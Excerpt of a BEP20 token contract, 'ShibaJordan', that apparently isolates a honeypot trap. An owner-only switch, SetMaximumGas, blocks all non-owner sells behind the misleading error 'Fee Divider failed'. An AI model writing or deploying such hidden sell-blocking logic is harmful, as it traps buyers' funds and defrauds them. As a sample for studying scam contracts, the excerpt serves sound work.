...
contract ShibaJordan is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "ShibaJordan";
    string constant _symbol = "ShibaJordan";
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!LimitGas || sender==owner), "Fee Divider failed");
    ...
    function SetMaximumGas(bool gas) external onlyOwner {
        LimitGas = gas;
    }
